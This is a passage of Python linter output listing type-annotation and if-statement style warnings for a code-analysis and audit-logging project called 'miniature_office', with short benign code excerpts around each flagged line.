429 |     layers: Dict[str, ArchitecturalLayer] = field(default_factory=dict)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:428:19
    |
426 |     architectural_style: ArchitecturalStyle = ArchitecturalStyle.UNKNOWN
427 |     components: Dict[str, ArchitecturalComponent] = field(default_factory=dict)
428 |     interactions: List[ComponentInteraction] = field(default_factory=list)
    |                   ^^^^
429 |     layers: Dict[str, ArchitecturalLayer] = field(default_factory=dict)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:429:13
    |
427 |     components: Dict[str, ArchitecturalComponent] = field(default_factory=dict)
428 |     interactions: List[ComponentInteraction] = field(default_factory=list)
429 |     layers: Dict[str, ArchitecturalLayer] = field(default_factory=dict)
    |             ^^^^
430 |
431 |     # Quality Assessment (complete)
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\design_analyzer.py:432:22
    |
431 |     # Quality Assessment (complete)
432 |     quality_metrics: Optional[DesignQualityMetrics] = None
    |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
433 |
434 |     # SOLID Principles (all violations)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:435:23
    |
434 |     # SOLID Principles (all violations)
435 |     solid_violations: List[SOLIDViolation] = field(default_factory=list)
    |                       ^^^^
436 |
437 |     # Design Smells (all detected)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:438:20
    |
437 |     # Design Smells (all detected)
438 |     design_smells: List[Tuple[DesignSmell, str, Tuple[int, int]]] = field(
    |                    ^^^^
439 |         default_factory=list
440 |     )
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:438:25
    |
437 |     # Design Smells (all detected)
438 |     design_smells: List[Tuple[DesignSmell, str, Tuple[int, int]]] = field(
    |                         ^^^^^
439 |         default_factory=list
440 |     )
    |
help: Replace with `tuple`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:438:49
    |
437 |     # Design Smells (all detected)
438 |     design_smells: List[Tuple[DesignSmell, str, Tuple[int, int]]] = field(
    |                                                 ^^^^^
439 |         default_factory=list
440 |     )
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:443:17
    |
442 |     # Interface Analysis (complete)
443 |     interfaces: List[InterfaceDesignAnalysis] = field(default_factory=list)
    |                 ^^^^
444 |
445 |     # Cross-Cutting Concerns (all identified)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:446:29
    |
445 |     # Cross-Cutting Concerns (all identified)
446 |     cross_cutting_concerns: Dict[CrossCuttingConcern, List[str]] = field(
    |                             ^^^^
447 |         default_factory=dict
448 |     )
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:446:55
    |
445 |     # Cross-Cutting Concerns (all identified)
446 |     cross_cutting_concerns: Dict[CrossCuttingConcern, List[str]] = field(
    |                                                       ^^^^
447 |         default_factory=dict
448 |     )
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:451:17
    |
450 |     # Invariants (all extracted)
451 |     invariants: List[DesignInvariant] = field(default_factory=list)
    |                 ^^^^
452 |
453 |     # Edge Cases (all identified)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:454:17
    |
453 |     # Edge Cases (all identified)
454 |     edge_cases: List[str] = field(default_factory=list)
    |                 ^^^^
455 |
456 |     # Failure Modes (complete analysis)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:457:20
    |
456 |     # Failure Modes (complete analysis)
457 |     failure_modes: List[FailureMode] = field(default_factory=list)
    |                    ^^^^
458 |
459 |     # Governance (complete structure)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:460:27
    |
459 |     # Governance (complete structure)
460 |     governance_structure: Dict[str, Any] = field(default_factory=dict)
    |                           ^^^^
461 |
462 |     # Extensibility Assessment
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:463:23
    |
462 |     # Extensibility Assessment
463 |     extension_points: List[str] = field(default_factory=list)
    |                       ^^^^
464 |     plugin_architecture: bool = False
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:467:28
    |
466 |     # Dependency Analysis
467 |     circular_dependencies: List[List[str]] = field(default_factory=list)
    |                            ^^^^
468 |     dependency_depth: int = 0
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:467:33
    |
466 |     # Dependency Analysis
467 |     circular_dependencies: List[List[str]] = field(default_factory=list)
    |                                 ^^^^
468 |     dependency_depth: int = 0
    |
help: Replace with `list`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\analysis\design_analyzer.py:615:13
    |
613 |           # Extract all methods
614 |           for node in class_node.body:
615 | /             if isinstance(node, ast.FunctionDef):
616 | |                 if not node.name.startswith("_"):
    | |_________________________________________________^
617 |                       component.public_methods.append(node.name)
    |
help: Combine `if` statements using `and`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:668:66
    |
666 |             return ComponentType.APPLICATION
667 |
668 |     def _extract_dependencies(self, class_node: ast.ClassDef) -> Set[str]:
    |                                                                  ^^^
669 |         """Extract all dependencies of a class"""
670 |         dependencies = set()
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:696:60
    |
694 |         return 0.7
695 |
696 |     def _extract_responsibilities(self, docstring: str) -> List[str]:
    |                                                            ^^^^
697 |         """Extract responsibilities from docstring"""
698 |         # Parse docstring for responsibility statements
    |
help: Replace with `list`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\analysis\design_analyzer.py:807:13
    |
805 |           # Look for classes with 'Factory' in name or create methods
806 |           for node in ast.walk(ast_root) if isinstance(ast_root, ast.AST) else []:
807 | /             if isinstance(node, ast.ClassDef):
808 | |                 if "Factory" in node.name or "Builder" in node.name:
    | |____________________________________________________________________^
809 |                       pattern = PatternInstance(
810 |                           pattern=DesignPattern.FACTORY_METHOD,
    |
help: Combine `if` statements using `and`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:963:48
    |
961 |             )
962 |
963 |     def _detect_circular_dependencies(self) -> List[List[str]]:
    |                                                ^^^^
964 |         """Detect circular dependencies using DFS"""
965 |         cycles = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\design_analyzer.py:963:53
    |
961 |             )
962 |
963 |     def _detect_circular_dependencies(self) -> List[List[str]]:
    |                                                     ^^^^
964 |         """Detect circular dependencies using DFS"""
965 |         cycles = []
    |
help: Replace with `list`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> src\app\miniature_office\analysis\design_analyzer.py:987:13
    |
985 |             rec_stack.remove(component_name)
986 |
987 |         for component_name in self.result.components.keys():
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
988 |             if component_name not in visited:
989 |                 dfs(component_name)
    |
help: Remove `.keys()`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\miniature_office\analysis\design_analyzer.py:1018:13
     |
1017 |           for node in ast.walk(ast_root) if isinstance(ast_root, ast.AST) else []:
1018 | /             if isinstance(node, ast.Call):
1019 | |                 if isinstance(node.func, ast.Attribute):
     | |________________________________________________________^
1020 |                       if node.func.attr in ["log", "info", "debug", "warning", "error"]:
1021 |                           logging_components.append("logging")
     |
help: Combine `if` statements using `and`

SIM114 [*] Combine `if` branches using logical `or` operator
    --> src\app\miniature_office\analysis\design_analyzer.py:1138:29
     |
1136 |                       if isinstance(item, ast.FunctionDef):
1137 |                           for decorator in item.decorator_list:
1138 | /                             if (
1139 | |                                 isinstance(decorator, ast.Name)
1140 | |                                 and decorator.id == "abstractmethod"
1141 | |                             ):
1142 | |                                 has_abstract_methods = True
1143 | |                                 break
1144 | |                             elif (
1145 | |                                 isinstance(decorator, ast.Attribute)
1146 | |                                 and decorator.attr == "abstractmethod"
1147 | |                             ):
1148 | |                                 has_abstract_methods = True
1149 | |                                 break
     | |_____________________________________^
1150 |
1151 |                   if is_abstract or has_abstract_methods:
     |
help: Combine `if` branches

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> src\app\miniature_office\analysis\design_analyzer.py:1181:34
     |
1179 |             )
1180 |
1181 |     def generate_report(self) -> Dict[str, Any]:
     |                                  ^^^^
1182 |         """
1183 |         Generate MAXIMUM DETAIL design report
     |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> src\app\miniature_office\analysis\flow_analyzer.py:4:1
  |
3 | from dataclasses import dataclass, field
4 | from typing import Dict, List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> src\app\miniature_office\analysis\flow_analyzer.py:4:1
  |
3 | from dataclasses import dataclass, field
4 | from typing import Dict, List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> src\app\miniature_office\analysis\flow_analyzer.py:4:1
  |
3 | from dataclasses import dataclass, field
4 | from typing import Dict, List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\analysis\flow_analyzer.py:12:17
   |
11 |     entry_node: str
12 |     exit_nodes: Set[str] = field(default_factory=set)
   |                 ^^^
13 |     edges: Dict[str, List[str]] = field(default_factory=dict)
   |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\analysis\flow_analyzer.py:13:12
   |
11 |     entry_node: str
12 |     exit_nodes: Set[str] = field(default_factory=set)
13 |     edges: Dict[str, List[str]] = field(default_factory=dict)
   |            ^^^^
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\flow_analyzer.py:13:22
   |
11 |     entry_node: str
12 |     exit_nodes: Set[str] = field(default_factory=set)
13 |     edges: Dict[str, List[str]] = field(default_factory=dict)
   |                      ^^^^
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\analysis\flow_analyzer.py:20:18
   |
18 |     """Data flow graph tracking variable definitions and uses"""
19 |
20 |     definitions: Dict[str, List[int]] = field(default_factory=dict)
   |                  ^^^^
21 |     uses: Dict[str, List[int]] = field(default_factory=dict)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\flow_analyzer.py:20:28
   |
18 |     """Data flow graph tracking variable definitions and uses"""
19 |
20 |     definitions: Dict[str, List[int]] = field(default_factory=dict)
   |                            ^^^^
21 |     uses: Dict[str, List[int]] = field(default_factory=dict)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\analysis\flow_analyzer.py:21:11
   |
20 |     definitions: Dict[str, List[int]] = field(default_factory=dict)
21 |     uses: Dict[str, List[int]] = field(default_factory=dict)
   |           ^^^^
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\flow_analyzer.py:21:21
   |
20 |     definitions: Dict[str, List[int]] = field(default_factory=dict)
21 |     uses: Dict[str, List[int]] = field(default_factory=dict)
   |                     ^^^^
   |
help: Replace with `list`

UP035 `typing.List` is deprecated, use `list` instead
 --> src\app\miniature_office\analysis\pattern_detector.py:5:1
  |
3 | from dataclasses import dataclass
4 | from enum import Enum
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\pattern_detector.py:44:44
   |
42 |     """Pattern and anti-pattern detection - placeholder"""
43 |
44 |     def detect_patterns(self, ast_root) -> List[DesignPattern]:
   |                                            ^^^^
45 |         return []
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\pattern_detector.py:47:48
   |
45 |         return []
46 |
47 |     def detect_antipatterns(self, ast_root) -> List[AntiPattern]:
   |                                                ^^^^
48 |         return []
   |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\analysis\semantic_analyzer.py:21:1
   |
19 | from dataclasses import dataclass, field
20 | from enum import Enum
21 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\analysis\semantic_analyzer.py:21:1
   |
19 | from dataclasses import dataclass, field
20 | from enum import Enum
21 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\analysis\semantic_analyzer.py:21:1
   |
19 | from dataclasses import dataclass, field
20 | from enum import Enum
21 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\semantic_analyzer.py:57:17
   |
55 |     definition_col: int
56 |     scope_id: str
57 |     references: List[tuple[int, int]] = field(
   |                 ^^^^
58 |         default_factory=list
59 |     )  # List of (line, col)
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\analysis\semantic_analyzer.py:60:20
   |
58 |         default_factory=list
59 |     )  # List of (line, col)
60 |     inferred_type: Optional[str] = None
   |                    ^^^^^^^^^^^^^
61 |     is_mutated: bool = False
62 |     is_exported: bool = False
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\analysis\semantic_analyzer.py:81:15
   |
79 |     scope_id: str
80 |     parent: Optional["SymbolTable"] = None
81 |     children: List["SymbolTable"] = field(default_factory=list)
   |               ^^^^
82 |     symbols: Dict[str, Symbol] = field(default_factory=dict)
83 |     imports: Set[str] = field(default_factory=set)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\analysis\semantic_analyzer.py:82:14
   |
80 |     parent: Optional["SymbolTable"] = None
81 |     children: List["SymbolTable"] = field(default_factory=list)
82 |     symbols: Dict[str, Symbol] = field(default_factory=dict)
   |              ^^^^
83 |     imports: Set[str] = field(default_factory=set)
84 |     exports: Set[str] = field(default_factory=set)
   |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\analysis\semantic_analyzer.py:83:14
   |
81 |     children: List["SymbolTable"] = field(default_factory=list)
82 |     symbols: Dict[str, Symbol] = field(default_factory=dict)
83 |     imports: Set[str] = field(default_factory=set)
   |              ^^^
84 |     exports: Set[str] = field(default_factory=set)
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\analysis\semantic_analyzer.py:84:14
   |
82 |     symbols: Dict[str, Symbol] = field(default_factory=dict)
83 |     imports: Set[str] = field(default_factory=set)
84 |     exports: Set[str] = field(default_factory=set)
   |              ^^^
85 |
86 |     def lookup(self, name: str) -> Optional[Symbol]:
   |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\analysis\semantic_analyzer.py:86:36
   |
84 |     exports: Set[str] = field(default_factory=set)
85 |
86 |     def lookup(self, name: str) -> Optional[Symbol]:
   |                                    ^^^^^^^^^^^^^^^^
87 |         """
88 |         Resolve name with scope chain traversal
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\analysis\semantic_analyzer.py:161:26
    |
160 |     def __init__(self):
161 |         self.root_table: Optional[SymbolTable] = None
    |                          ^^^^^^^^^^^^^^^^^^^^^
162 |         self.issues: List[Dict] = []
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\semantic_analyzer.py:162:22
    |
160 |     def __init__(self):
161 |         self.root_table: Optional[SymbolTable] = None
162 |         self.issues: List[Dict] = []
    |                      ^^^^
163 |
164 |     def analyze(self, ast_root) -> SymbolTable:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\semantic_analyzer.py:162:27
    |
160 |     def __init__(self):
161 |         self.root_table: Optional[SymbolTable] = None
162 |         self.issues: List[Dict] = []
    |                           ^^^^
163 |
164 |     def analyze(self, ast_root) -> SymbolTable:
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\analysis\semantic_analyzer.py:186:29
    |
184 |         return self.root_table
185 |
186 |     def get_issues(self) -> List[Dict]:
    |                             ^^^^
187 |         """
188 |         Return all detected semantic issues
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\analysis\semantic_analyzer.py:186:34
    |
184 |         return self.root_table
185 |
186 |     def get_issues(self) -> List[Dict]:
    |                                  ^^^^
187 |         """
188 |         Return all detected semantic issues
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\audit.py:12:1
   |
10 | from datetime import datetime
11 | from enum import Enum
12 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\audit.py:12:1
   |
10 | from datetime import datetime
11 | from enum import Enum
12 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\core\audit.py:12:1
   |
10 | from datetime import datetime
11 | from enum import Enum
12 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\audit.py:43:15
   |
41 |     event_type: EventType = EventType.AGENT_ACTION
42 |     timestamp: datetime = field(default_factory=datetime.utcnow)
43 |     actor_id: Optional[str] = None  # Entity that caused the event
   |               ^^^^^^^^^^^^^
44 |     target_id: Optional[str] = None  # Entity affected by the event
45 |     data: Dict[str, Any] = field(default_factory=dict)
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\audit.py:44:16
   |
42 |     timestamp: datetime = field(default_factory=datetime.utcnow)
43 |     actor_id: Optional[str] = None  # Entity that caused the event
44 |     target_id: Optional[str] = None  # Entity affected by the event
   |                ^^^^^^^^^^^^^
45 |     data: Dict[str, Any] = field(default_factory=dict)
46 |     parent_events: List[str] = field(default_factory=list)  # Causality links
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\audit.py:45:11
   |
43 |     actor_id: Optional[str] = None  # Entity that caused the event
44 |     target_id: Optional[str] = None  # Entity affected by the event
45 |     data: Dict[str, Any] = field(default_factory=dict)
   |           ^^^^
46 |     parent_events: List[str] = field(default_factory=list)  # Causality links
47 |     _hash: Optional[str] = None
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\audit.py:46:20
   |
44 |     target_id: Optional[str] = None  # Entity affected by the event
45 |     data: Dict[str, Any] = field(default_factory=dict)
46 |     parent_events: List[str] = field(default_factory=list)  # Causality links
   |                    ^^^^
47 |     _hash: Optional[str] = None
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\audit.py:47:12
   |
45 |     data: Dict[str, Any] = field(default_factory=dict)
46 |     parent_events: List[str] = field(default_factory=list)  # Causality links
47 |     _hash: Optional[str] = None
   |            ^^^^^^^^^^^^^
48 |
49 |     def __post_init__(self):
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\audit.py:72:26
   |
70 |         return self._hash == self._calculate_hash()
71 |
72 |     def to_dict(self) -> Dict:
   |                          ^^^^
73 |         """Serialize event to dictionary"""
74 |         return {
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\audit.py:93:22
   |
92 |     def __init__(self):
93 |         self.events: Dict[str, AuditEvent] = {}
   |                      ^^^^
94 |         self.children: Dict[str, Set[str]] = {}  # parent_id -> set of child_ids
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\audit.py:94:24
   |
92 |     def __init__(self):
93 |         self.events: Dict[str, AuditEvent] = {}
94 |         self.children: Dict[str, Set[str]] = {}  # parent_id -> set of child_ids
   |                        ^^^^
95 |
96 |     def add_event(self, event: AuditEvent) -> None:
   |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\core\audit.py:94:34
   |
92 |     def __init__(self):
93 |         self.events: Dict[str, AuditEvent] = {}
94 |         self.children: Dict[str, Set[str]] = {}  # parent_id -> set of child_ids
   |                                  ^^^
95 |
96 |     def add_event(self, event: AuditEvent) -> None:
   |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\audit.py:112:43
    |
110 |             self.children[parent_id].add(event.event_id)
111 |
112 |     def get_event(self, event_id: str) -> Optional[AuditEvent]:
    |                                           ^^^^^^^^^^^^^^^^^^^^
113 |         """Retrieve an event by ID"""
114 |         return self.events.get(event_id)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:116:46
    |
114 |         return self.events.get(event_id)
115 |
116 |     def get_children(self, event_id: str) -> List[AuditEvent]:
    |                                              ^^^^
117 |         """Get all events caused by a given event"""
118 |         child_ids = self.children.get(event_id, set())
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:121:45
    |
119 |         return [self.events[cid] for cid in child_ids if cid in self.events]
120 |
121 |     def get_lineage(self, event_id: str) -> List[AuditEvent]:
    |                                             ^^^^
122 |         """
123 |         Get complete lineage (ancestry chain) of an event.
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:145:49
    |
143 |         return lineage
144 |
145 |     def get_descendants(self, event_id: str) -> List[AuditEvent]:
    |                                                 ^^^^
146 |         """Get all events descended from a given event"""
147 |         descendants = []
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\audit.py:171:27
    |
169 |     def __init__(self):
170 |         self.graph = CausalityGraph()
171 |         self._type_index: Dict[EventType, List[str]] = {}
    |                           ^^^^
172 |         self._actor_index: Dict[str, List[str]] = {}
173 |         self._target_index: Dict[str, List[str]] = {}
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:171:43
    |
169 |     def __init__(self):
170 |         self.graph = CausalityGraph()
171 |         self._type_index: Dict[EventType, List[str]] = {}
    |                                           ^^^^
172 |         self._actor_index: Dict[str, List[str]] = {}
173 |         self._target_index: Dict[str, List[str]] = {}
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\audit.py:172:28
    |
170 |         self.graph = CausalityGraph()
171 |         self._type_index: Dict[EventType, List[str]] = {}
172 |         self._actor_index: Dict[str, List[str]] = {}
    |                            ^^^^
173 |         self._target_index: Dict[str, List[str]] = {}
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:172:38
    |
170 |         self.graph = CausalityGraph()
171 |         self._type_index: Dict[EventType, List[str]] = {}
172 |         self._actor_index: Dict[str, List[str]] = {}
    |                                      ^^^^
173 |         self._target_index: Dict[str, List[str]] = {}
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\audit.py:173:29
    |
171 |         self._type_index: Dict[EventType, List[str]] = {}
172 |         self._actor_index: Dict[str, List[str]] = {}
173 |         self._target_index: Dict[str, List[str]] = {}
    |                             ^^^^
174 |
175 |     def log_event(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:173:39
    |
171 |         self._type_index: Dict[EventType, List[str]] = {}
172 |         self._actor_index: Dict[str, List[str]] = {}
173 |         self._target_index: Dict[str, List[str]] = {}
    |                                       ^^^^
174 |
175 |     def log_event(
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\audit.py:178:19
    |
176 |         self,
177 |         event_type: EventType,
178 |         actor_id: Optional[str] = None,
    |                   ^^^^^^^^^^^^^
179 |         target_id: Optional[str] = None,
180 |         data: Optional[Dict] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\audit.py:179:20
    |
177 |         event_type: EventType,
178 |         actor_id: Optional[str] = None,
179 |         target_id: Optional[str] = None,
    |                    ^^^^^^^^^^^^^
180 |         data: Optional[Dict] = None,
181 |         parent_events: Optional[List[str]] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\audit.py:180:15
    |
178 |         actor_id: Optional[str] = None,
179 |         target_id: Optional[str] = None,
180 |         data: Optional[Dict] = None,
    |               ^^^^^^^^^^^^^^
181 |         parent_events: Optional[List[str]] = None,
182 |     ) -> AuditEvent:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\audit.py:180:24
    |
178 |         actor_id: Optional[str] = None,
179 |         target_id: Optional[str] = None,
180 |         data: Optional[Dict] = None,
    |                        ^^^^
181 |         parent_events: Optional[List[str]] = None,
182 |     ) -> AuditEvent:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\audit.py:181:24
    |
179 |         target_id: Optional[str] = None,
180 |         data: Optional[Dict] = None,
181 |         parent_events: Optional[List[str]] = None,
    |                        ^^^^^^^^^^^^^^^^^^^
182 |     ) -> AuditEvent:
183 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:181:33
    |
179 |         target_id: Optional[str] = None,
180 |         data: Optional[Dict] = None,
181 |         parent_events: Optional[List[str]] = None,
    |                                 ^^^^
182 |     ) -> AuditEvent:
183 |         """
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:214:60
    |
212 |         return event
213 |
214 |     def get_events_by_type(self, event_type: EventType) -> List[AuditEvent]:
    |                                                            ^^^^
215 |         """Get all events of a specific type"""
216 |         event_ids = self._type_index.get(event_type, [])
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:221:53
    |
219 |         ]
220 |
221 |     def get_events_by_actor(self, actor_id: str) -> List[AuditEvent]:
    |                                                     ^^^^
222 |         """Get all events performed by a specific actor"""
223 |         event_ids = self._actor_index.get(actor_id, [])
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:228:55
    |
226 |         ]
227 |
228 |     def get_events_by_target(self, target_id: str) -> List[AuditEvent]:
    |                                                       ^^^^
229 |         """Get all events affecting a specific target"""
230 |         event_ids = self._target_index.get(target_id, [])
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:235:53
    |
233 |         ]
234 |
235 |     def get_change_lineage(self, target_id: str) -> List[AuditEvent]:
    |                                                     ^^^^
236 |         """
237 |         Get complete change lineage for a target entity.
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\audit.py:244:33
    |
242 |         return sorted(events, key=lambda e: e.timestamp)
243 |
244 |     def get_events(self, limit: Optional[int] = None) -> List[Dict]:
    |                                 ^^^^^^^^^^^^^
245 |         """
246 |         Get recent events as dictionaries.
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\audit.py:244:58
    |
242 |         return sorted(events, key=lambda e: e.timestamp)
243 |
244 |     def get_events(self, limit: Optional[int] = None) -> List[Dict]:
    |                                                          ^^^^
245 |         """
246 |         Get recent events as dictionaries.
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
